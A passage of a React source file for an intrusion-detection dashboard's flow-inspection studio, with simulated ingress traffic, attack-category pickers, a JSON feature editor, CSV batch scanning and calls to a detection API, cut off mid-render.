      if (timerRef.current) clearInterval(timerRef.current)
    }
  }, [isStreaming, streamInterval, schemaMode])

  // Live Ingress telemetry simulation (Incoming Traffic from Protected Website / API Client)
  useEffect(() => {
    if (isIngressActive && isIngressSimulating) {
      ingressTimerRef.current = setInterval(async () => {
        const item = INGRESS_PRESETS[Math.floor(Math.random() * INGRESS_PRESETS.length)]
        const flowPayload = makeDynamicFlow(item.label, 77)
        try {
          const res = await api.detect({
            source_ip: item.ip,
            dest_ip: '10.0.0.1',
            features: flowPayload
          })
          const isAtk = res.is_attack || (res.attack_type && res.attack_type !== 'BENIGN')
          const action = isAtk
            ? (res.severity_score >= 4 ? 'DROP (403)' : 'RATE_LIMIT (429)')
            : 'ALLOW (200)'
          const newEntry = {
            id: Date.now() + Math.random(),
            time: new Date().toLocaleTimeString('en-US', { hour12: false }) + '.' + String(Date.now() % 1000).padStart(3, '0'),
            source_ip: item.ip,
            method: item.method,
            path: item.path,
            label: res.attack_type,
            category: res.attack_category || item.category,
            confidence: res.confidence,
            severity_score: res.severity_score,
            is_attack: isAtk,
            action,
            flow: flowPayload,
            res
          }
          setIngressLogs(prev => [newEntry, ...prev.slice(0, 39)])
        } catch (err) {
          // silent catch
        }
      }, ingressInterval * 1000)
    } else {
      if (ingressTimerRef.current) {
        clearInterval(ingressTimerRef.current)
        ingressTimerRef.current = null
      }
    }
    return () => {
      if (ingressTimerRef.current) clearInterval(ingressTimerRef.current)
    }
  }, [isIngressActive, isIngressSimulating, ingressInterval])

  function inspectIngressFlow(log) {
    setFeatureText(JSON.stringify(log.flow, null, 2))
    setResult(log.res)
    window.scrollTo({ top: 180, behavior: 'smooth' })
  }

  function handleCopy() {
    navigator.clipboard.writeText(featureText)
    setCopied(true)
    setTimeout(() => setCopied(false), 1500)
  }

  function formatCurrentJson() {
    try {
      const parsed = JSON.parse(featureText)
      setFeatureText(JSON.stringify(parsed, null, 2))
    } catch (e) {
      // ignore
    }
  }

  // Real-time HUD summary extracted from current featureText
  let parsedSummary = { proto: 6, dur: 0, fwdPkts: 0, bwdPkts: 0, bytesSec: 0, pktsSec: 0 }
  try {
    const p = JSON.parse(featureText)
    const f = (p && p.features) ? p.features : p
    parsedSummary = {
      proto: f.Protocol ?? 6,
      dur: f['Flow Duration'] ?? 0,
      fwdPkts: f['Total Fwd Packets'] ?? 0,
      bwdPkts: f['Total Backward Packets'] ?? 0,
      bytesSec: f['Flow Bytes/s'] ?? 0,
      pktsSec: f['Flow Packets/s'] ?? 0,
    }
  } catch (e) {
    // ignore
  }

  const sevColor = result ? attackColor(result.attack_type) : 'var(--text-muted)'
  const isAttackVerdict = result?.is_attack || (result?.attack_type && result.attack_type !== 'BENIGN')

  return (
    <div style={{ padding: '24px 32px', maxWidth: 1600, margin: '0 auto' }}>
      
      {/* Top Operations Header with KOPO Branding */}
      <div style={{
        display: 'flex',
        flexWrap: 'wrap',
        justifyContent: 'space-between',
        alignItems: 'center',
        background: 'var(--header-gradient)',
        border: '1px solid var(--border)',
        borderRadius: 'var(--radius-lg)',
        padding: '16px 24px',
        marginBottom: 18,
        boxShadow: 'var(--card-shadow)',
      }}>
        <div style={{ display: 'flex', alignItems: 'center', gap: 14 }}>
          <div style={{
            width: 44, height: 44, borderRadius: 'var(--radius-md)',
            background: 'linear-gradient(135deg, rgba(0, 212, 255, 0.2) 0%, rgba(189, 147, 249, 0.2) 100%)',
            border: '1px solid rgba(0, 212, 255, 0.35)',
            display: 'flex', alignItems: 'center', justifyContent: 'center', color: 'var(--accent-cyan)',
            boxShadow: '0 0 16px rgba(0, 212, 255, 0.2)'
          }}>
            <Shield size={24} />
          </div>
          <div>
            <div style={{ display: 'flex', alignItems: 'center', gap: 8 }}>
              <span style={{ fontSize: 20, fontWeight: 800, letterSpacing: '0.04em', color: 'var(--text-primary)' }}>
                KOPO // LIVE THREAT DETECTION STUDIO
              </span>
              <span style={{
                fontSize: 10, padding: '2px 8px', borderRadius: 12,
                background: 'rgba(57,211,83,0.15)', color: 'var(--accent-green)',
                fontWeight: 700, border: '1px solid rgba(57,211,83,0.3)'
              }}>
                ● 35 GRANULAR ATTACK CLASSES ARMED
              </span>
            </div>
            <div style={{ fontSize: 12, color: 'var(--text-secondary)', marginTop: 2 }}>
              Dynamic Multi-Signature Synthesis · Enterprise 77-Feature & Simplified 10-Feature Inspection
            </div>
          </div>
        </div>

        {/* Live Controls: IDS Stream & Ingress Web Traffic */}
        <div style={{ display: 'flex', alignItems: 'center', gap: 10 }}>
          {/* Live Ingress Webhook Trigger */}
          <button
            onClick={() => setIsIngressActive(!isIngressActive)}
            title="Toggle Live Web Ingress stream from protected website & webhook API"
            style={{
              display: 'flex', alignItems: 'center', gap: 7,
              background: isIngressActive ? 'linear-gradient(135deg, rgba(57,211,83,0.3) 0%, rgba(57,211,83,0.15) 100%)' : 'rgba(189,147,249,0.12)',
              border: `1px solid ${isIngressActive ? 'var(--accent-green)' : 'var(--accent-purple)'}`,
              color: isIngressActive ? 'var(--accent-green)' : 'var(--accent-purple)',
              borderRadius: 'var(--radius-sm)', padding: '8px 14px', fontSize: 12, cursor: 'pointer',
              fontFamily: 'var(--font-mono)', fontWeight: 800,
              boxShadow: isIngressActive ? '0 0 16px rgba(57,211,83,0.3)' : 'none',
              transition: 'all 0.2s ease'
            }}
          >
            {isIngressActive ? (
              <>
                <span style={{ width: 8, height: 8, borderRadius: '50%', background: 'var(--accent-green)', animation: 'pulse-dot 1s infinite' }} />
                <span>🌐 Ingress Stream Active</span>
              </>
            ) : (
              <>
                <Globe size={14} className="animate-pulse" />
                <span>🌐 Live Web Ingress</span>
              </>
            )}
          </button>

          {/* Live IDS Stream Telemetry Generator Controls */}
          <div style={{
            display: 'flex', alignItems: 'center', gap: 6,
            background: 'var(--bg-elevated)', border: '1px solid var(--border)',
            borderRadius: 'var(--radius-sm)', padding: '3px 6px'
          }}>
            <button
              onClick={isStreaming ? stopStreaming : startStreaming}
              title="Continuous live network flow injection into detection engine"
              style={{
                display: 'flex', alignItems: 'center', gap: 7,
                background: isStreaming ? 'linear-gradient(135deg, rgba(255,71,87,0.3) 0%, rgba(255,71,87,0.15) 100%)' : 'linear-gradient(135deg, rgba(0,212,255,0.25) 0%, rgba(57,211,83,0.15) 100%)',
                border: `1px solid ${isStreaming ? 'var(--accent-red)' : 'var(--accent-cyan)'}`,
                color: isStreaming ? 'var(--accent-red)' : 'var(--accent-cyan)',
                borderRadius: 'var(--radius-sm)', padding: '8px 16px', fontSize: 12, cursor: 'pointer',
                fontFamily: 'var(--font-mono)', fontWeight: 800,
                boxShadow: isStreaming ? '0 0 16px rgba(255,71,87,0.4)' : '0 0 14px rgba(0,212,255,0.25)',
                transition: 'all 0.2s ease'
              }}
            >
              {isStreaming ? (
                <>
                  <span style={{ width: 8, height: 8, borderRadius: '50%', background: 'var(--accent-red)', animation: 'pulse-dot 1s infinite' }} />
                  <span>🔴 Stop IDS Stream</span>
                </>
              ) : (
                <>
                  <Radio size={14} className="animate-pulse" />
                  <span>⚡ Live IDS Stream</span>
                </>
              )}
            </button>

            <select
              value={streamInterval}
              onChange={e => setStreamInterval(Number(e.target.value))}
              disabled={isStreaming}
              style={{
                background: 'transparent', border: 'none', color: 'var(--text-secondary)',
                fontSize: 11, padding: '6px 8px', outline: 'none', cursor: 'pointer', fontFamily: 'var(--font-mono)'
              }}
            >
              <option value={1}>1s / flow</option>
              <option value={2}>2s / flow</option>
              <option value={3}>3s / flow</option>
              <option value={5}>5s / flow</option>
            </select>
          </div>
        </div>
      </div>

      {/* Main Grid: Left Flow Studio | Right SOC Diagnostics */}
      <div style={{ display: 'grid', gridTemplateColumns: '1.08fr 0.92fr', gap: 24, alignItems: 'start' }}>
        
        {/* LEFT COLUMN: Flow Injection Studio */}
        <div style={{
          background: 'var(--bg-surface)',
          border: '1px solid var(--border)',
          borderRadius: 'var(--radius-lg)',
          padding: '20px 22px',
          boxShadow: 'var(--card-shadow)',
        }}>
          {/* Header & Mode Switcher */}
          <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: 14 }}>
            <div style={{ display: 'flex', alignItems: 'center', gap: 8 }}>
              <Terminal size={15} color="var(--accent-cyan)" />
              <span style={{ fontSize: 12, color: 'var(--text-primary)', letterSpacing: '0.04em', textTransform: 'uppercase', fontWeight: 700 }}>
                FLOW TELEMETRY STUDIO
              </span>
            </div>

            <button
              onClick={randomizeAny}
              disabled={isStreaming}
              title="Generate a brand new randomized flow"
              style={{
                display: 'flex', alignItems: 'center', gap: 6, padding: '6px 14px', fontSize: 11,
                background: 'rgba(189,147,249,0.16)', border: '1px solid var(--accent-purple)',
                color: 'var(--accent-purple)', borderRadius: 'var(--radius-sm)', cursor: 'pointer', fontWeight: 700,
                transition: 'all 0.15s'
              }}
            >
              <Shuffle size={12} /> 🎲 Randomize Any Vector
            </button>
          </div>

          {/* Segmented Schema Mode Switcher: 77 Features vs 10 Features */}
          <div style={{
            display: 'flex', gap: 4, marginBottom: 14,
            background: 'var(--bg-elevated)', padding: 4, borderRadius: 'var(--radius-md)', border: '1px solid var(--border)'
          }}>
            <button
              onClick={() => handleModeChange(77)}
              style={{
                flex: 1, padding: '8px 14px', fontSize: 11, fontWeight: schemaMode === 77 ? 700 : 500,
                borderRadius: 'var(--radius-sm)', border: 'none', cursor: 'pointer',
                background: schemaMode === 77 ? 'rgba(0, 212, 255, 0.18)' : 'transparent',
                color: schemaMode === 77 ? 'var(--accent-cyan)' : 'var(--text-secondary)',
                boxShadow: schemaMode === 77 ? '0 0 10px rgba(0, 212, 255, 0.2)' : 'none',
                transition: 'all 0.15s', display: 'flex', alignItems: 'center', justifyContent: 'center', gap: 6
              }}
            >
              <Layers size={13} />
              <span>Enterprise Schema (77 Fields → 69 Canonical)</span>
            </button>
            <button
              onClick={() => handleModeChange(10)}
              style={{
                flex: 1, padding: '8px 14px', fontSize: 11, fontWeight: schemaMode === 10 ? 700 : 500,
                borderRadius: 'var(--radius-sm)', border: 'none', cursor: 'pointer',
                background: schemaMode === 10 ? 'rgba(0, 212, 255, 0.18)' : 'transparent',
                color: schemaMode === 10 ? 'var(--accent-cyan)' : 'var(--text-secondary)',
                boxShadow: schemaMode === 10 ? '0 0 10px rgba(0, 212, 255, 0.2)' : 'none',
                transition: 'all 0.15s', display: 'flex', alignItems: 'center', justifyContent: 'center', gap: 6
              }}
            >
              <Zap size={13} />
              <span>Simplified Flow (10 Features)</span>
            </button>
          </div>

          {/* ACTIVE VECTOR INDICATOR BAR */}
          <div style={{
            display: 'flex', flexWrap: 'wrap', alignItems: 'center', justifyContent: 'space-between', gap: 10,
            background: 'var(--bg-elevated)', border: '1px solid var(--border)',
            borderRadius: 'var(--radius-md)', padding: '10px 14px', marginBottom: 14
          }}>
            <div style={{ display: 'flex', alignItems: 'center', gap: 8, flexWrap: 'wrap' }}>
              <span style={{ fontSize: 11, color: 'var(--text-muted)', textTransform: 'uppercase', fontWeight: 700 }}>
                Selected Vector:
              </span>
              <span style={{
                fontSize: 11, padding: '3px 9px', borderRadius: 'var(--radius-sm)',
                background: 'rgba(0, 212, 255, 0.15)', color: 'var(--accent-cyan)', fontWeight: 700,
                border: '1px solid rgba(0, 212, 255, 0.3)'
              }}>
                {activeCategory}
              </span>
              <span style={{ color: 'var(--text-muted)', fontWeight: 800 }}>➔</span>
              <span style={{
                fontSize: 11, padding: '3px 10px', borderRadius: 'var(--radius-sm)',
                background: activeSubtype === 'BENIGN' ? 'rgba(57, 211, 83, 0.15)' : 'rgba(255, 71, 87, 0.15)',
                color: activeSubtype === 'BENIGN' ? 'var(--accent-green)' : 'var(--accent-red)',
                fontFamily: 'var(--font-mono)', fontWeight: 700,
                border: `1px solid ${activeSubtype === 'BENIGN' ? 'rgba(57, 211, 83, 0.3)' : 'rgba(255, 71, 87, 0.3)'}`
              }}>
                {activeSubtype}
              </span>
            </div>

            <button
              onClick={() => applyFlow(activeCategory, activeSubtype)}
              style={{
                display: 'flex', alignItems: 'center', gap: 4,
                background: 'transparent', border: '1px solid var(--border)',
                color: 'var(--text-secondary)', padding: '4px 10px', borderRadius: 'var(--radius-sm)',
                fontSize: 11, cursor: 'pointer', fontWeight: 600
              }}
            >
              <RefreshCw size={11} /> Re-roll Vector
            </button>
          </div>

          {/* THREAT CATEGORY NAVIGATOR WITH DROPDOWN ARROWS (▼) */}
          <div ref={dropdownRef} style={{ marginBottom: 16 }}>
            <div style={{ fontSize: 11, color: 'var(--text-muted)', textTransform: 'uppercase', letterSpacing: '0.04em', fontWeight: 700, marginBottom: 8, display: 'flex', alignItems: 'center', justifyContent: 'space-between' }}>
              <span>Threat Categories (Click Arrow ▾ for Attack Vectors):</span>
              <span style={{ color: 'var(--accent-cyan)', fontSize: 10, fontWeight: 600 }}>Active Sub-Type shown next to Arrow ▾</span>
            </div>
            
            <div style={{ display: 'grid', gridTemplateColumns: 'repeat(4, 1fr)', gap: 10 }}>
              {THREAT_CATEGORIES.map(cat => {
                const isCatActive = activeCategory === cat.name
                const isOpen = openDropdown === cat.id
                return (
                  <div key={cat.id} style={{ position: 'relative' }}>
                    
                    {/* Category Card */}
                    <div style={{
                      background: isCatActive ? `${cat.color}15` : 'var(--bg-elevated)',
                      border: `1px solid ${isCatActive ? cat.color : 'var(--border)'}`,
                      borderRadius: 'var(--radius-md)',
                      padding: '8px 10px',
                      boxShadow: isCatActive ? `0 0 12px ${cat.color}30` : 'none',
                      display: 'flex', flexDirection: 'column', gap: 6,
                      transition: 'all 0.2s ease'
                    }}>
                      {/* Top Row: Icon + Category Name */}
                      <button
                        onClick={() => selectCategory(cat)}
                        title={`Select ${cat.name}`}
                        style={{
                          display: 'flex', alignItems: 'center', justifyContent: 'space-between',
                          background: 'none', border: 'none', cursor: 'pointer', padding: 0,
                          color: isCatActive ? cat.color : 'var(--text-primary)',
                          textAlign: 'left'
                        }}
                      >
                        <div style={{ display: 'flex', alignItems: 'center', gap: 6, overflow: 'hidden' }}>
                          <span style={{ fontSize: 14 }}>{cat.icon}</span>
                          <span style={{ fontSize: 12, fontWeight: 800, whiteSpace: 'nowrap', overflow: 'hidden', textOverflow: 'ellipsis' }}>
                            {cat.shortName}
                          </span>
                        </div>
                        {isCatActive && (
                          <span style={{ width: 6, height: 6, borderRadius: '50%', background: cat.color, animation: 'pulse-dot 1.5s infinite', flexShrink: 0 }} />
                        )}
                      </button>

                      {/* Bottom Row: Arrow ▾ and Sub-Type Indicator right next to it */}
                      <div style={{ display: 'flex', alignItems: 'center', gap: 4 }}>
                        {cat.subtypes.length > 1 ? (
                          <button
                            onClick={e => {
                              e.stopPropagation()
                              setOpenDropdown(isOpen ? null : cat.id)
                            }}
                            title={`Toggle ${cat.subtypes.length} vectors in ${cat.name}`}
                            style={{
                              flex: 1, display: 'flex', alignItems: 'center', justifyContent: 'space-between',
                              background: isCatActive ? `${cat.color}25` : 'var(--bg-surface)',
                              border: `1px solid ${isCatActive ? `${cat.color}60` : 'var(--border)'}`,
                              borderRadius: 'var(--radius-sm)', padding: '4px 8px',
                              color: isCatActive ? cat.color : 'var(--text-secondary)',
                              cursor: 'pointer', fontSize: 10, fontFamily: 'var(--font-mono)', fontWeight: 700
                            }}
                          >
                            <div style={{ display: 'flex', alignItems: 'center', gap: 5, overflow: 'hidden' }}>
                              <ChevronDown size={13} style={{ transform: isOpen ? 'rotate(180deg)' : 'none', transition: 'transform 0.2s ease', color: cat.color, flexShrink: 0 }} />
                              <span style={{ overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>
                                {isCatActive ? activeSubtype : `${cat.subtypes.length} types`}
                              </span>
                            </div>
                            <span style={{ fontSize: 9, opacity: 0.7 }}>▾</span>
                          </button>
                        ) : (
                          <div style={{
                            flex: 1, display: 'flex', alignItems: 'center', gap: 5,
                            background: isCatActive ? `${cat.color}20` : 'var(--bg-surface)',
                            border: `1px solid ${isCatActive ? `${cat.color}50` : 'var(--border)'}`,
                            borderRadius: 'var(--radius-sm)', padding: '4px 8px',
                            color: isCatActive ? cat.color : 'var(--text-muted)',
                            fontSize: 10, fontFamily: 'var(--font-mono)', fontWeight: 700
                          }}>
                            <Check size={12} color={cat.color} />
                            <span>BENIGN Flow</span>
                          </div>
                        )}
                      </div>
                    </div>

                    {/* Expandable Sub-Types Popover Menu */}
                    {isOpen && (
                      <div className="animate-slide" style={{
                        position: 'absolute', top: '100%', left: 0, right: 0, marginTop: 4, zIndex: 100, minWidth: 200,
                        background: 'var(--bg-surface)', border: `1px solid ${cat.color}`,
                        borderRadius: 'var(--radius-md)', padding: 6,
                        boxShadow: 'var(--dropdown-shadow)'
                      }}>
                        <div style={{ fontSize: 10, color: 'var(--text-muted)', textTransform: 'uppercase', padding: '4px 8px', fontWeight: 800, borderBottom: '1px solid var(--border)', marginBottom: 4 }}>
                          {cat.name} ({cat.subtypes.length} Vectors)
                        </div>
                        {cat.subtypes.map(sub => {
                          const isSubActive = isCatActive && activeSubtype === sub
                          return (
                            <button
                              key={sub}
                              onClick={() => selectSubtype(cat.name, sub)}
                              style={{
                                width: '100%', display: 'flex', alignItems: 'center', justifyContent: 'space-between',
                                padding: '6px 8px', fontSize: 11, fontFamily: 'var(--font-mono)', fontWeight: isSubActive ? 800 : 500,
                                background: isSubActive ? `${cat.color}22` : 'transparent',
                                color: isSubActive ? cat.color : 'var(--text-primary)',
                                border: 'none', borderRadius: 'var(--radius-sm)', cursor: 'pointer', textAlign: 'left',
                                transition: 'background 0.15s'
                              }}
                            >
                              <span>{sub}</span>
                              {isSubActive && <Check size={12} color={cat.color} />}
                            </button>
                          )
                        })}
                      </div>
                    )}
                  </div>
                )
              })}
            </div>
          </div>

          {/* TELEMETRY HUD BAR */}
          <div style={{
            display: 'grid', gridTemplateColumns: 'repeat(4, 1fr)', gap: 8,
            background: 'var(--bg-elevated)', border: '1px solid var(--border)',
            borderRadius: 'var(--radius-md)', padding: '10px 14px', marginBottom: 12
          }}>
            <div>
              <div style={{ fontSize: 10, color: 'var(--text-muted)', textTransform: 'uppercase' }}>Protocol</div>
              <div style={{ fontSize: 13, fontWeight: 700, color: 'var(--accent-cyan)', fontFamily: 'var(--font-mono)' }}>
                {parsedSummary.proto === 6 ? 'TCP (6)' : parsedSummary.proto === 17 ? 'UDP (17)' : parsedSummary.proto === 1 ? 'ICMP (1)' : `Proto ${parsedSummary.proto}`}
              </div>
            </div>
            <div>
              <div style={{ fontSize: 10, color: 'var(--text-muted)', textTransform: 'uppercase' }}>Duration</div>
              <div style={{ fontSize: 13, fontWeight: 700, color: 'var(--text-primary)', fontFamily: 'var(--font-mono)' }}>
                {parsedSummary.dur > 1000000 ? `${(parsedSummary.dur / 1e6).toFixed(2)} s` : `${(parsedSummary.dur / 1000).toFixed(1)} ms`}
              </div>
            </div>
            <div>
              <div style={{ fontSize: 10, color: 'var(--text-muted)', textTransform: 'uppercase' }}>Packet Rate</div>
              <div style={{ fontSize: 13, fontWeight: 700, color: parsedSummary.pktsSec > 5000 ? 'var(--accent-red)' : 'var(--accent-green)', fontFamily: 'var(--font-mono)' }}>
                {Number(parsedSummary.pktsSec).toLocaleString()} /s
              </div>
            </div>
            <div>
              <div style={{ fontSize: 10, color: 'var(--text-muted)', textTransform: 'uppercase' }}>Bandwidth</div>
              <div style={{ fontSize: 13, fontWeight: 700, color: parsedSummary.bytesSec > 1000000 ? 'var(--accent-red)' : 'var(--accent-cyan)', fontFamily: 'var(--font-mono)' }}>
                {parsedSummary.bytesSec > 1000000 ? `${(parsedSummary.bytesSec / 1e6).toFixed(2)} MB/s` : `${(parsedSummary.bytesSec / 1000).toFixed(1)} KB/s`}
              </div>
            </div>
          </div>

          {/* JSON Textarea with Actions */}
          <div style={{ position: 'relative' }}>
            <div style={{
              display: 'flex', justifyContent: 'space-between', alignItems: 'center',
              background: 'var(--bg-elevated)', borderTopLeftRadius: 'var(--radius-md)', borderTopRightRadius: 'var(--radius-md)',
              border: '1px solid var(--border)', borderBottom: 'none', padding: '7px 12px'
            }}>
              <span style={{ fontSize: 11, color: 'var(--text-secondary)', display: 'flex', alignItems: 'center', gap: 6 }}>
                <Hash size={12} color="var(--accent-cyan)" />
                <span>JSON Flow Vector ({schemaMode === 10 ? '10 Fields' : '77 Fields'})</span>
              </span>
              <div style={{ display: 'flex', alignItems: 'center', gap: 8 }}>
                <input
                  type="file"
                  ref={fileInputRef}
                  onChange={handleCsvFile}
                  accept=".csv,.json,.jsonl"
                  style={{ display: 'none' }}
                />
                <button
                  onClick={() => fileInputRef.current?.click()}
                  style={{ display: 'flex', alignItems: 'center', gap: 4, background: 'none', border: 'none', color: 'var(--accent-cyan)', fontSize: 11, cursor: 'pointer', fontWeight: 600 }}
                  title="Upload CSV to inspect and replay network flows row-by-row"
                >
                  <Upload size={12} /> Upload Flow File
                </button>
                <span style={{ color: 'var(--border)' }}>|</span>
                <button
                  onClick={formatCurrentJson}
                  style={{ background: 'none', border: 'none', color: 'var(--text-secondary)', fontSize: 11, cursor: 'pointer' }}
                >
                  Beautify
                </button>
                <span style={{ color: 'var(--border)' }}>|</span>
                <button
                  onClick={handleCopy}
                  style={{ display: 'flex', alignItems: 'center', gap: 4, background: 'none', border: 'none', color: copied ? 'var(--accent-green)' : 'var(--text-secondary)', fontSize: 11, cursor: 'pointer' }}
                >
                  {copied ? <Check size={12} /> : <Copy size={12} />} {copied ? 'Copied' : 'Copy'}
                </button>
              </div>
            </div>

            {/* CSV / File Batch Replay Strip if file loaded */}
            {(csvRows.length > 0 || csvFileObj) && (
              <div style={{
                display: 'flex', flexWrap: 'wrap', alignItems: 'center', justifyContent: 'space-between', gap: 8,
                background: 'rgba(0, 212, 255, 0.08)', border: '1px solid var(--border)',
                borderBottom: 'none', padding: '6px 12px', fontSize: 11
              }}>
                <div style={{ display: 'flex', alignItems: 'center', gap: 6, color: 'var(--accent-cyan)' }}>
                  <FileSpreadsheet size={13} />
                  <span><b>{csvFileName}</b>{csvRows.length ? `: Row ${csvRowIndex + 1} of ${csvRows.length}` : ''}</span>
                </div>
                <div style={{ display: 'flex', alignItems: 'center', gap: 6, flexWrap: 'wrap' }}>
                  {csvRows.length > 0 && (
                    <>
                      <button
                        disabled={csvRowIndex <= 0}
                        onClick={() => loadCsvRow(csvRows[csvRowIndex - 1], csvRowIndex - 1)}
                        style={{
                          background: 'var(--bg-elevated)', border: '1px solid var(--border)',
                          color: csvRowIndex <= 0 ? 'var(--text-muted)' : 'var(--text-primary)',
                          padding: '2px 8px', borderRadius: 'var(--radius-sm)', cursor: csvRowIndex <= 0 ? 'not-allowed' : 'pointer', fontSize: 10
                        }}
                      >
                        ◀ Prev
                      </button>
                      <button
                        disabled={csvRowIndex >= csvRows.length - 1}
                        onClick={() => loadCsvRow(csvRows[csvRowIndex + 1], csvRowIndex + 1)}
                        style={{
                          background: 'var(--bg-elevated)', border: '1px solid var(--border)',
                          color: csvRowIndex >= csvRows.length - 1 ? 'var(--text-muted)' : 'var(--text-primary)',
                          padding: '2px 8px', borderRadius: 'var(--radius-sm)', cursor: csvRowIndex >= csvRows.length - 1 ? 'not-allowed' : 'pointer', fontSize: 10
                        }}
                      >
                        Next ▶
                      </button>
                    </>
                  )}
                  <label style={{ display: 'flex', alignItems: 'center', gap: 4, fontSize: 10, color: 'var(--text-secondary)', cursor: 'pointer' }}>
                    <input
                      type="checkbox"
                      checked={batchAutoAggregate}
                      onChange={e => setBatchAutoAggregate(e.target.checked)}
                    />
                    <span>Auto-aggregate Incidents</span>
                  </label>
                  <button
                    onClick={handleBatchUpload}
                    disabled={batchUploading}
                    style={{
                      background: 'var(--accent-cyan)', color: '#000', border: 'none',
                      padding: '3px 10px', borderRadius: 'var(--radius-sm)', fontSize: 10, fontWeight: 800,
                      cursor: batchUploading ? 'wait' : 'pointer'
                    }}
                  >
                    {batchUploading ? 'Scanning...' : 'Batch Scan All Rows'}
                  </button>
                  <button
                    onClick={() => { setCsvRows([]); setCsvFileName(null); setCsvFileObj(null); setCsvRowIndex(0); setBatchSummary(null) }}
                    style={{ background: 'none', border: 'none', color: 'var(--text-muted)', cursor: 'pointer', fontSize: 10, marginLeft: 4 }}
                  >
                    Clear
                  </button>
                </div>
              </div>
            )}

            {batchSummary && (
              <div style={{
                background: 'rgba(57, 211, 83, 0.08)', border: '1px solid rgba(57, 211, 83, 0.35)',
                borderBottom: 'none', padding: '8px 12px', fontSize: 11, color: 'var(--text-primary)'
              }}>
                <b>Batch Scan Complete ({batchSummary.filename}):</b> {batchSummary.processed}/{batchSummary.total_rows} flows scanned ·{' '}
                <span style={{ color: 'var(--accent-red)', fontWeight: 700 }}>{batchSummary.attacks_detected} attacks</span> ·{' '}
                <span style={{ color: 'var(--accent-amber)', fontWeight: 700 }}>{batchSummary.alerts_created} alerts saved</span> ·{' '}
                <span style={{ color: 'var(--accent-purple)', fontWeight: 700 }}>{batchSummary.incidents_created} incidents created</span>
              </div>
            )}

            <textarea
              value={featureText}
              onChange={e => { setFeatureText(e.target.value); if (isStreaming) stopStreaming() }}
              style={{
                width: '100%', minHeight: 250, background: 'var(--code-bg)', border: '1px solid var(--border)',
                borderBottomLeftRadius: 'var(--radius-md)', borderBottomRightRadius: 'var(--radius-md)',
                color: '#e6edf3', fontFamily: 'var(--font-mono)', fontSize: 12, padding: 12, resize: 'vertical', outline: 'none',
                lineHeight: 1.5
              }}
              spellCheck={false}
            />
          </div>

          {/* Action Row */}
          <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', marginTop: 14 }}>
            <div style={{ display: 'flex', alignItems: 'center', gap: 10 }}>
              <button
                onClick={() => executeDetect()}
                disabled={loading || isStreaming}
                style={{
                  display: 'flex', alignItems: 'center', gap: 8,
                  background: loading || isStreaming ? 'var(--bg-elevated)' : 'var(--accent-cyan)',
                  color: loading || isStreaming ? 'var(--text-muted)' : '#ffffff',
                  border: 'none', borderRadius: 'var(--radius-sm)', padding: '10px 24px',
                  fontSize: 13, fontWeight: 700, cursor: (loading || isStreaming) ? 'not-allowed' : 'pointer',
                  boxShadow: (loading || isStreaming) ? 'none' : '0 0 15px rgba(0, 212, 255, 0.3)',
                  transition: 'all 0.15s'
                }}
              >
                {loading ? <RefreshCw size={14} className="animate-spin" /> : <Send size={14} />}
                {loading ? 'Inspecting Flow...' : 'Run Detection'}
              </button>

              <button
                onClick={isStreaming ? stopStreaming : startStreaming}
                style={{
                  display: 'flex', alignItems: 'center', gap: 7,
                  background: isStreaming ? 'rgba(255,71,87,0.18)' : 'rgba(0, 212, 255, 0.12)',
                  border: `1px solid ${isStreaming ? 'var(--accent-red)' : 'var(--accent-cyan)'}`,
                  color: isStreaming ? 'var(--accent-red)' : 'var(--accent-cyan)',
                  borderRadius: 'var(--radius-sm)', padding: '9px 18px', fontSize: 12, cursor: 'pointer',
                  fontFamily: 'var(--font-mono)', fontWeight: 800,
                  transition: 'all 0.15s'
                }}
              >
                {isStreaming ? (
                  <>
                    <span style={{ width: 7, height: 7, borderRadius: '50%', background: 'var(--accent-red)', animation: 'pulse-dot 1s infinite' }} />
                    <span>Stop IDS Stream</span>
                  </>
                ) : (
                  <>
                    <Radio size={13} className="animate-pulse" />
                    <span>Live IDS Stream</span>
                  </>
                )}
              </button>

              {/* THIRD BUTTON: Live Web Ingress Stream (Incoming Traffic from Protected Website / Webhook) */}
              <button
                onClick={() => setIsIngressActive(!isIngressActive)}
                title="Stream real-time incoming traffic from your protected website / API consumer"
                style={{
                  display: 'flex', alignItems: 'center', gap: 7,
                  background: isIngressActive ? 'rgba(57, 211, 83, 0.18)' : 'rgba(189, 147, 249, 0.12)',
                  border: `1px solid ${isIngressActive ? 'var(--accent-green)' : 'var(--accent-purple)'}`,
                  color: isIngressActive ? 'var(--accent-green)' : 'var(--accent-purple)',
                  borderRadius: 'var(--radius-sm)', padding: '9px 18px', fontSize: 12, cursor: 'pointer',
                  fontFamily: 'var(--font-mono)', fontWeight: 800,
                  boxShadow: isIngressActive ? '0 0 16px rgba(57, 211, 83, 0.35)' : 'none',
                  transition: 'all 0.15s'
                }}
              >
                {isIngressActive ? (
                  <>
                    <span style={{ width: 7, height: 7, borderRadius: '50%', background: 'var(--accent-green)', animation: 'pulse-dot 1s infinite' }} />
                    <span>Ingress Stream Active</span>
                  </>
                ) : (
                  <>
                    <Globe size={13} className="animate-pulse" />
                    <span>Live Web Ingress</span>
                  </>
                )}
              </button>
            </div>

            {isStreaming && (
              <div style={{ display: 'flex', alignItems: 'center', gap: 6, fontSize: 12, color: 'var(--accent-green)', fontFamily: 'var(--font-mono)', fontWeight: 700 }}>
                <Activity size={15} className="animate-pulse" />
                <span>STREAM ACTIVE: #{streamCount} · Every {streamInterval}s</span>
              </div>
            )}
          </div>

          {error && <div style={{ marginTop: 12, fontSize: 12, color: 'var(--accent-red)' }}>Error: {error}</div>}
        </div>

        {/* RIGHT COLUMN: SOC Threat Diagnostics */}
        <div style={{
          background: 'var(--bg-surface)',
          border: '1px solid var(--border)',
          borderRadius: 'var(--radius-lg)',
          padding: '20px 22px',
          boxShadow: 'var(--card-shadow)',
        }}>
          <div style={{ fontSize: 12, color: 'var(--text-primary)', letterSpacing: '0.04em', textTransform: 'uppercase', fontWeight: 700, marginBottom: 14, display: 'flex', alignItems: 'center', gap: 8 }}>
            <ShieldAlert size={15} color={sevColor} />
            <span>AI THREAT DIAGNOSTICS & VERDICT</span>
          </div>

          {!result ? (
            <div style={{
              display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center',
              height: 400, color: 'var(--text-muted)', gap: 14, border: '1px dashed var(--border)', borderRadius: 'var(--radius-md)', background: 'var(--bg-base)'
            }}>
              <Zap size={38} color="var(--border)" className="animate-pulse" />
